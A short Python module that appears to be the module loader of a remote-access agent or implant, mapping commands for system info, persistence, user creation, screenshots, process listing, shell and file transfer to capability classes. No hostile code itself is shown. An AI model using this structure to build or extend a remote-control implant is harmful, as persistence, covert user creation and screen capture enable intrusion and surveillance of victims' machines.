from .advanced_capabilities import (
    SystemInfoModule, 
    PersistenceModule, 
    UserManagementModule,
    ScreenshotModule,
    ProcessManagerModule
)

def load_all_modules():
    """Load all available modules"""
    return {
        'sysinfo': SystemInfoModule(),
        'persistence': PersistenceModule(),
        'useradd': UserManagementModule(),
        'screenshot': ScreenshotModule(),
        'process_list': ProcessManagerModule(),
        'shell': None,  # Basic shell is handled in agent
        'download': None,  # File transfer handled in agent
        'upload': None,    # File transfer handled in agent
    }